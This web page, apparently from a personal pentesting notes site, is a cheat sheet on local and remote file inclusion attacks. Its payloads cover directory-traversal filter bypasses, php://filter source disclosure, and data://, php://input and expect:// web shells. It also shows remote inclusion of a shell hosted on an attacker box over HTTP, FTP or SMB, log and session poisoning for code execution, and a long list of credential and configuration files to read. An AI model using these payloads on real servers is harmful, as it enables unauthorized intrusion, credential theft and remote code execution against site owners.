<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/web-exploitation/file-inclusion</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/web-exploitation/file-inclusion"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/">home</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>file inclusion</h1>

<p>file inclusion occurs when insecurely coded parameters on a site allow for reading the content of local files on the server (LFI) or distant files (RFI).</p>

<h2>local file inclusion (LFI)</h2>

<p>LFI usually occurs with templating engines, which are designed to select which static parts are always displayed on a site (header, footer, etc) while loading dynamic content depending on the page. if the latter is loaded through a parameter such as <code>/index?page=blog</code>, we might test it and try to display server files. two common files we might try to read are <code>/etc/passwd</code> on linux and <code>C:\Windows\boot.ini</code> on windows.</p>

<p>if the source code is appending its vulnerable parameter to a base path, we can use <code>../../../etc/passwd</code>, as many times as we want, to traverse directories.</p>

<p>if the source code is appending its vulnerable parameter to a filename, we can prefix our payload with <code>/../../../etc/password</code> instead. it might work if a directory named after the file is also present.</p>

<p>if we craft a payload on a resource being fetched by the server instead of a simple parameter, we might be able to poison a database entry, like replacing our avatar image by <code>/etc/passwd</code>. this might lead to another webapp fetching and using this poisoned entry, which we refer to as a <code>second-order attack</code>.</p>

<h3>basic bypasses</h3>

<p>if the webapp has some filters in place, we can try to bypass them, as some of them might be very insecure. if the filter is simply deleting substrings of <code>../</code>, we could use <code>....//</code> or similar payloads, which will output <code>../</code> after filtering.</p>

<p>if chars are excluded like like <code>.</code> or <code>/</code>, we can use a URL-encoded payload like <code>%2e%2e%2f</code> instead of <code>../</code>. for some filters, a double URL-encoded payload might also work.</p>

<p>if the filter is checking that we&#39;re staying in a specific path, we might circumvent this by including the desired path before the rest of our payload, such as <code>./blog/../../../etc/passwd</code>.</p>

<p>if we are limited by an appended file extension such as <code>.php</code>, we might circumvent this with path truncation if the PHP version on our target is older than <code>5.3 / 5.4</code>. this relies on PHP truncating strings longer than 4096 characters, including trailing slashes and dots. for this to work, we also need to start our payload with a non-existing directory.</p>

<p>we can generate this long payload with this one-liner:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"non_existing_directory/../../../etc/passwd/"</span> <span class="o">&amp;&amp;</span> <span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..2048<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"./"</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div>

<p>if our PHP version is older than <code>5.5</code>, we may also use null byte injection: adding a null byte (<code>%00</code>) at the end of the string will terminate it and not consider anything after it. so if we use <code>/etc/passwd%00</code> and our payload ends up as <code>/etc/passwd%00.php</code> after passing through a filter, the <code>.php</code> will not be appended.</p>

<h3>PHP filters</h3>

<p>PHP filters are a type of PHP wrappers, which can allow us to fetch PHP source files as they are, rather than relying on them rendering HTML output. disclosing the target&#39;s code base this way can lead to valuable data, such as admin credentials or disclosure of other vulnerabilities.</p>

<p>once we&#39;ve fuzzed the target and gathered a list of PHP files we might disclose, we can use the <code>convert.base64-encode</code> PHP read filter to get a base64 blob of a source file:</p>

<div class="highlight"><pre class="highlight php"><code><span class="n">php</span><span class="o">://</span><span class="n">filter</span><span class="o">/</span><span class="n">read</span><span class="o">=</span><span class="n">convert</span><span class="mf">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=&lt;</span><span class="n">filename</span><span class="o">&gt;</span>
</code></pre></div>

<p>if we include this filter in our working payload, we can then copy the entire base64 blob it outputs, and decode it on our machine with <code>echo &#39;&lt;base64 blob&gt;&#39; | base64 -d</code>, leading to source code disclosure.</p>

<h3>remote code execution with PHP wrappers</h3>

<p>we can get more control and reach RCE on our target with PHP wrappers: for this to work, we first need to check if <code>allow_url_include</code> is enabled in our target&#39;s PHP configuration.</p>

<ul>
<li>for apache, try to read <code>/etc/php/&lt;version number e.g. 7.4&gt;/apache2/php.ini</code></li>
<li>for nginx, try to read <code>/etc/php/&lt;version number e.g. 7.4&gt;/fpm/php.ini</code></li>
</ul>

<p>use curl or a web proxy to read any of them with <code>php://filter/read=convert.base64-encode/resource=&lt;filename&gt;</code>, by guessing the version number from most recent to least recent.</p>

<p>once we get a base64 blob, check it with <code>echo &#39;&lt;base64 blob&gt;&#39; | base64 -d | grep -i allow_url_include</code>. we might also need to check for the expect wrapper, with <code>echo &#39;&lt;base64 blob&gt;&#39; | base64 -d | grep -i expect</code>.</p>

<p>if <code>allow_url_include</code> is enabled, we can include and use external data like PHP code:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># base64 encode a basic PHP shell:</span>
<span class="nb">echo</span> <span class="s1">'&lt;?php system($_GET["cmd"]); ?&gt;'</span> | <span class="nb">base64</span>

<span class="c"># use base64-encoded payload with a data wrapper in our LFI:</span>
curl <span class="nt">-s</span> <span class="s1">'https://&lt;domain name or IP&gt;:&lt;port&gt;/index.php?&lt;vulnerable parameter&gt;=data://text/plain;base64,&lt;base64 blob&gt;&amp;cmd=id'</span> | <span class="nb">grep </span>uid

<span class="c"># use our shell with an input wrapper in our LFI.</span>
<span class="c"># same result as our data wrapper but it uses POST for our shell instead of GET.</span>
curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s1">'&lt;?php system($_GET["cmd"]); ?&gt;'</span> <span class="s1">'https://&lt;domain name or IP&gt;:&lt;port&gt;/index.php?&lt;vulnerable parameter&gt;=php://input&amp;cmd=id'</span> | <span class="nb">grep </span>uid

<span class="c"># if we can't pass parameters with GET, edit the php shell command directly:</span>
curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s1">'&lt;?php system("id"); ?&gt;'</span> <span class="s1">'https://&lt;domain name or IP&gt;:&lt;port&gt;/index.php?&lt;vulnerable parameter&gt;=php://input'</span> | <span class="nb">grep </span>uid

<span class="c"># if expect wrapper is enabled in PHP configuration,</span>
<span class="c"># run commands directly:</span>
curl <span class="nt">-s</span> <span class="s1">'https://&lt;domain name or IP&gt;:&lt;port&gt;/index.php?&lt;vulnerable parameter&gt;=expect://id'</span>
</code></pre></div>

<h3>Interesting files for LFI</h3>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Home directories</span>
?page<span class="o">=</span>/home/&lt;username&gt;/.bashrc
?page<span class="o">=</span>/home/&lt;username&gt;/.bash_history
?page<span class="o">=</span>/home/&lt;username&gt;/.bash_logout
?page<span class="o">=</span>/home/&lt;username&gt;/.bash_profile
?page<span class="o">=</span>/home/&lt;username&gt;/.profile
?page<span class="o">=</span>/home/&lt;username&gt;/.ssh/id_rsa

<span class="c"># Root directory</span>
?page<span class="o">=</span>/root/.bashrc
?page<span class="o">=</span>/root/.bash_history
?page<span class="o">=</span>/root/.bash_logout
?page<span class="o">=</span>/root/.bash_profile
?pgae<span class="o">=</span>/root/.profile
?page<span class="o">=</span>/root/.ssh/id_rsa

<span class="c"># System-wide configurations</span>
?page<span class="o">=</span>/etc/bash.bashrc

<span class="c"># OS</span>
?page<span class="o">=</span>/etc/lsb-release
?page<span class="o">=</span>/etc/os-release

<span class="c"># Processes</span>
?page<span class="o">=</span>/proc/net/tcp
?page<span class="o">=</span>/proc/self/cmdline
?page<span class="o">=</span>/proc/self/environ
?page<span class="o">=</span>/proc/self/fd/0
?page<span class="o">=</span>/proc/self/fd/1
?page<span class="o">=</span>/proc/&lt;pid&gt;/cmdline
?page<span class="o">=</span>/proc/&lt;pid&gt;/environ

<span class="c"># Mail</span>
?page<span class="o">=</span>/var/mail/&lt;username&gt;
?page<span class="o">=</span>/var/spool/mail/&lt;username&gt;
<span class="c"># Postfix</span>
?page<span class="o">=</span>/var/log/mail.log
?page<span class="o">=</span>/var/log/maillog

<span class="c"># Host</span>
?page<span class="o">=</span>/etc/hosts
?page<span class="o">=</span>/etc/hostname
<span class="c"># Cron</span>
?page<span class="o">=</span>/etc/crontab

<span class="c"># Web root</span>
?page<span class="o">=</span>/var/www/html/index.html
?page<span class="o">=</span>/var/www/html/index.php
?page<span class="o">=</span>/var/www/html/.htaccess
?page<span class="o">=</span>/var/www/html/.htpasswd
?page<span class="o">=</span>/var/www/example.com/index.php
?page<span class="o">=</span>/var/www/sudomain/index.php
?page<span class="o">=</span>/var/www/subdomain.example.com/index.php
?page<span class="o">=</span>/var/www/wordpress/index.php

<span class="c"># Apache</span>
?page<span class="o">=</span>/etc/apache2/.htpasswd
?page<span class="o">=</span>/etc/apache2/apache2.conf
?page<span class="o">=</span>/etc/apache2/envvars
?page<span class="o">=</span>/etc/apache2/ports.conf
?page<span class="o">=</span>/etc/apache2/sites-available/domain.conf
?page<span class="o">=</span>/etc/apache2/sites-available/example.com.conf
?page<span class="o">=</span>/etc/apache2/sites-available/sub.example.com.conf
?page<span class="o">=</span>/etc/apache2/sites-available/sub.conf
?page<span class="o">=</span>/etc/apache2/sites-enabled/000-default.conf
?page<span class="o">=</span>/etc/apache2/sites-enabled/domain.conf
?page<span class="o">=</span>/etc/apache2/sites-enabled/example.com.conf
?page<span class="o">=</span>/etc/apache2/sites-enabled/sub.example.com.conf
?page<span class="o">=</span>/etc/apache2/sites-enabled/sub.conf
?page<span class="o">=</span>/var/log/apache/access.log
?page<span class="o">=</span>/var/log/apache/error.log
?page<span class="o">=</span>/var/log/apache2/access.log
?page<span class="o">=</span>/var/log/apache2/error.log

<span class="c"># Apache Tomcat</span>
?page<span class="o">=</span>/opt/tomcat/conf/tomcat-users.xml
?page<span class="o">=</span>/opt/tomcat/logs/catalina.err
?page<span class="o">=</span>/opt/tomcat/logs/catalina.out

<span class="c"># Nginx</span>
?page<span class="o">=</span>/var/log/nginx/access.log
?page<span class="o">=</span>/var/log/nginx/error.log
?page<span class="o">=</span>/etc/nginx/nginx.conf
?page<span class="o">=</span>/etc/nginx/conf.d/.htpasswd
?page<span class="o">=</span>/etc/nginx/conf.d/example.com.conf
?page<span class="o">=</span>/etc/nginx/conf.d/example.conf
?page<span class="o">=</span>/etc/nginx/conf.d/subdomain.example.com.conf
?page<span class="o">=</span>/etc/nginx/conf.d/subdomain.conf
?page<span class="o">=</span>/etc/nginx/sites-available/default
?page<span class="o">=</span>/etc/nginx/sites-available/example.com.conf
?page<span class="o">=</span>/etc/nginx/sites-enabled/default
?page<span class="o">=</span>/etc/nginx/sites-enabled/example.com.conf
?page<span class="o">=</span>/usr/local/nginx/conf/nginx.conf
?page<span class="o">=</span>/usr/local/etc/nginx/nginx.conf

<span class="c"># PHP web conf (x.x is specified PHP version)</span>
?page<span class="o">=</span>/etc/php/x.x/apache2/php.ini
?page<span class="o">=</span>/etc/php/x.x/cli/php.ini
?page<span class="o">=</span>/etc/php/x.x/fpm/php.ini

<span class="c"># Flask</span>
?page<span class="o">=</span>index.html
?page<span class="o">=</span>../__init__.py
?page<span class="o">=</span>../app.py
?page<span class="o">=</span>../db.py
?page<span class="o">=</span>../main.py
?page<span class="o">=</span>/home/&lt;username&gt;/&lt;appname&gt;/app.py
?page<span class="o">=</span>/opt/&lt;appname&gt;/app.py
?page<span class="o">=</span>/srv/&lt;appname&gt;/app.py

<span class="c"># BIND</span>
?page<span class="o">=</span>/etc/bind/named.conf
?page<span class="o">=</span>/etc/bind/named.conf.options
?page<span class="o">=</span>/etc/bind/named.conf.local
?page<span class="o">=</span>/etc/bind/named.conf.default-zones

<span class="c"># Windows</span>
?page<span class="o">=</span>C:/Windows/debug/NetSetup.log 
?page<span class="o">=</span>C:/Windows/System32/drivers/etc/hosts
?page<span class="o">=</span>C:/Windows/System32/inetsrv/config/applicationHost.config
?page<span class="o">=</span>../../../../../../../../windows/system32/drivers/etc/hosts
?page<span class="o">=</span>C:/Users/Public/Desktop/desktop.ini
?page<span class="o">=</span>C:/Users/FUZZ/Desktop/desktop.ini <span class="c"># user enumeration</span>
?page<span class="o">=</span>C:/inetpub/wwwroot/&lt;project&gt;/web.config
?page<span class="o">=</span>C:/xampp/apache/conf/httpd.conf
?page<span class="o">=</span>C:/xampp/apache/conf/extra/httpd-userdir.conf
?page<span class="o">=</span>C:/xampp/apache/conf/extra/httpd-vhosts.conf
?page<span class="o">=</span>C:/xampp/apache/conf/extra/httpd-xampp.conf
?page<span class="o">=</span>C:/xampp/apache/conf/extra/httpd-ajp.conf
?page<span class="o">=</span>C:/xampp/apache/logs/access.log
?page<span class="o">=</span>C:/xampp/apache/logs/error.log
?page<span class="o">=</span>C:/xampp/cgi-bin/example.cgi
?page<span class="o">=</span>C:/xampp/htdocs/example.com/index.php
?page<span class="o">=</span>C:/xampp/htdocs/sub.example.com/index.php
?page<span class="o">=</span>C:/xampp/phpMyAdmin/index.php
?page<span class="o">=</span>C:/xampp/phpMyAdmin/config.inc.php
</code></pre></div>

<h2>remote file inclusion (RFI)</h2>

<p>if inclusion of remote URLs is allowed <strong>and</strong> the function parsing user input permits it too (check section below), we can try for RFI. this has many advantages, like enumerating internal ports and applications and gaining RCE through a script that we host.</p>

<p>to reliably check for RFI, include a local URL as payload for the vulnerable parameter. using the site itself is an option, such as <code>http://&lt;domain name or target IP&gt;:&lt;port&gt;/index.php?&lt;vulnerable parameter&gt;=http://127.0.0.1:80/index.php</code>. this will ensure our attempt isn&#39;t blocked by a firewall or other protections, but be careful about potential recursive loop that may DoS the server.</p>

<p>if the page is included <strong>and</strong> rendered, we know we can leverage code execution through RFI.</p>

<p>we now have to create a web shell with the language used by the back-end server: for instance, we can use <code>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php</code> for PHP. other web shell templates are <a href="https://ovelny.sh/chaos/reverse-shells/" rel="nofollow">available here</a>.</p>

<p>the web shell can then be hosted and used with several protocols:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># host a HTTP server with python.</span>
<span class="c"># try port 80 and 443 as sudo in case our</span>
<span class="c"># target's firewall is blocking other ports:</span>
<span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server &lt;80 or 443&gt;
<span class="c"># execute commands with GET:</span>
curl <span class="nt">-s</span> <span class="s1">'http://&lt;domain name or target IP&gt;:&lt;port&gt;/index.php?&lt;vulnerable parameter&gt;=http://&lt;attack box IP&gt;:&lt;attack box port 80 or 443&gt;/shell.php&amp;cmd=id'</span>

<span class="c"># host a FTP server with python.</span>
<span class="c"># useful if a WAF is blocking 'http://':</span>
<span class="nb">sudo </span>python3 <span class="nt">-m</span> pyftpdlib <span class="nt">-p</span> 21
<span class="c"># execute commands with GET:</span>
curl <span class="nt">-s</span> <span class="s1">'http://&lt;domain name or target IP&gt;:&lt;port&gt;/index.php?&lt;vulnerable parameter&gt;=ftp://&lt;attack box IP&gt;/shell.php&amp;cmd=id'</span>
<span class="c"># you can also specify credentials if needed:</span>
curl <span class="nt">-s</span> <span class="s1">'http://&lt;domain name or target IP&gt;:&lt;port&gt;/index.php?&lt;vulnerable parameter&gt;=ftp://&lt;username&gt;:&lt;password&gt;@&lt;attack box IP&gt;/shell.php&amp;cmd=id'</span>

<span class="c"># host a SMB server if target is a windows server.</span>
<span class="c"># allow_url_include isn't even needed with SMB and windows:</span>
impacket-smbserver <span class="nt">-smb2support</span> share <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>
<span class="c"># execute commands with GET:</span>
curl <span class="nt">-s</span> <span class="s1">'http://&lt;domain name or target IP&gt;:&lt;port&gt;/index.php?&lt;vulnerable parameter&gt;=\\&lt;attack box IP&gt;\share\shell.php&amp;cmd=id'</span>
</code></pre></div>

<h3>PHP session poisoning</h3>

<p>if the target&#39;s webapp has read privileges over logged files, we can also leverage them with log poisoning: injecting PHP code into them (or the language used by the back-end server) that we will then call and execute.</p>

<p><code>PHPSESSID</code> cookies can be poisoned: they hold user data on the back-end and are stored in <code>session</code> files, in <code>/var/lib/php/sessions</code> on linux and in <code>C:\Windows\Temp</code> on windows. if our cookie&#39;s value is <code>qwerty</code>, our user data will be held in the <code>sess_qwerty</code> file on mentioned locations.</p>

<p>we can use our LFI/RFI to check the content of our session file, like <code>curl -s &#39;http://&lt;domain name or target IP&gt;:&lt;port&gt;/index.php?&lt;vulnerable parameter&gt;=/var/lib/php/sessions/sess_qwerty&#39;</code></p>

<p>if a value in our session file is under our control <strong>and</strong> the LFI/RFI is parsed through a function that has execute privileges, we can upload a URL-encoded web shell such as <code>%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code> to our session file and run commands with it, for example with <code>curl -s &#39;http://&lt;domain name or target IP&gt;:&lt;port&gt;/index.php?&lt;vulnerable parameter&gt;=/var/lib/php/sessions/sess_qwerty&amp;cmd=id&#39;</code>. keep in mind that the session file has to been poisoned again for every new command: writing a permanent web shell or a reverse shell with the initial web shell would be a more resilient option.</p>

<h3>server log poisoning</h3>

<p>we can poison log files too. for instance, <code>access.log</code> will hold our requests made to the target&#39;s server with the <code>user-agent</code> header, which we can easily edit with a web proxy or curl before sending the request. by replacing it with a web shell and using the LFI/RFI to access the log file, we can achieve remote code execution:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># log a request with a php web shell as our user-agent:</span>
curl <span class="nt">-s</span> <span class="s1">'http://&lt;domain name or target IP&gt;:&lt;port&gt;/index.php'</span> <span class="nt">--user-agent</span> <span class="s2">"&lt;?php echo '&lt;pre&gt;' . shell_exec('ls /')  . '&lt;/pre&gt;'; ?&gt;"</span>

<span class="c"># access log file with GET parameter for our web shell:</span>
curl <span class="nt">-s</span> <span class="s1">'http://&lt;domain name or target IP&gt;:&lt;port&gt;/index.php?&lt;vulnerable parameter&gt;=/var/log/apache2/access.log&amp;cmd=id'</span>
</code></pre></div>

<ul>
<li>apache logs are usually located in <code>/var/log/apache2</code> on linux and <code>C:\xampp\apache\logs\</code> on windows</li>
<li>nginx logs are usually located in <code>/var/log/nginx/</code> on linux and <code>C:\nginx\log\</code> on windows</li>
<li>nginx logs are usually readable by low privileged users</li>
<li>apache logs are usually readable by high privileged users only</li>
</ul>

<p>logs might be located somewhere else, in that case fuzzing our target with a wordlist found in <code>/usr/share/seclists/Fuzzing/LFI/</code> might be useful.</p>

<p>the <code>user-agent</code> header can also be logged in <code>proc</code> files on linux, like <code>/proc/self/environ</code> or <code>/proc/self/fd/&lt;PID&gt;</code>. this might be useful if we have read access to them.</p>

<p>other log files can be poisoned:</p>

<ul>
<li><code>/var/log/sshd.log</code></li>
<li><code>/var/log/mail</code></li>
<li><code>/var/log/vsftpd.log</code></li>
</ul>

<p>for example, we could use our web shell payload as the username during a SSH login attempt, and then read <code>/var/log/sshd.log</code> from our LFI/RFI. the same principle can be applied to any readable log file.</p>

<h2>vulnerable functions</h2>

<p>if we have access to the source code or we are performing a whitebox pentest, it&#39;s important which functions are vulnerable and how, depending on the programming language. some might only allow to read content while others might allow for executing files and even remote URLs:</p>

<table><thead>
<tr>
<th>programming language - function</th>
<th>read content</th>
<th>execute</th>
<th>remote URL</th>
</tr>
</thead><tbody>
<tr>
<td>PHP - include() / include_once()</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
</tr>
<tr>
<td>PHP - require() / require_once()</td>
<td>yes</td>
<td>yes</td>
<td>no</td>
</tr>
<tr>
<td>PHP - file_get_contents()</td>
<td>yes</td>
<td>no</td>
<td>yes</td>
</tr>
<tr>
<td>PHP - fopen() / file()</td>
<td>yes</td>
<td>no</td>
<td>no</td>
</tr>
<tr>
<td>nodeJS - fs.readFile()</td>
<td>yes</td>
<td>no</td>
<td>no</td>
</tr>
<tr>
<td>nodeJS - fs.sendFile()</td>
<td>yes</td>
<td>no</td>
<td>no</td>
</tr>
<tr>
<td>nodeJS - res.render()</td>
<td>yes</td>
<td>yes</td>
<td>no</td>
</tr>
<tr>
<td>java - include</td>
<td>yes</td>
<td>no</td>
<td>no</td>
</tr>
<tr>
<td>java - import</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
</tr>
<tr>
<td>dotnet - @Html.Partial()</td>
<td>yes</td>
<td>no</td>
<td>no</td>
</tr>
<tr>
<td>dotnet - @Html.RemotePartial()</td>
<td>yes</td>
<td>no</td>
<td>yes</td>
</tr>
<tr>
<td>dotnet - Response.WriteFile()</td>
<td>yes</td>
<td>no</td>
<td>no</td>
</tr>
<tr>
<td>dotnet - include</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
</tr>
</tbody></table>

<h2>useful wordlists</h2>

<p>use these wordlists with ffuf:</p>

<ul>
<li><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters" rel="nofollow">top 25 parameters</a></li>
<li>parameters: <code>/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt</code></li>
<li>general purpose: <code>/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt</code></li>
<li>linux web root:<code>/usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt</code></li>
<li>windows web root:<code>/usr/share/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt</code></li>
<li><a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux" rel="nofollow">linux logs and configuration</a></li>
<li><a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows" rel="nofollow">windows logs and configuration</a></li>
</ul>

<h2>references</h2>

<ul>
<li><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion" rel="nofollow">https://book.hacktricks.xyz/pentesting-web/file-inclusion</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md" rel="nofollow">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md</a></li>
<li><a href="https://notchxor.github.io/oscp-notes/2-web/LFI-RFI/" rel="nofollow">https://notchxor.github.io/oscp-notes/2-web/LFI-RFI/</a></li>
<li><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-inclusion/" rel="nofollow">https://exploit-notes.hdks.org/exploit/web/security-risk/file-inclusion/</a></li>
</ul>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section">「七転び八起き」</div>
    </footer>
  </body>
</html>

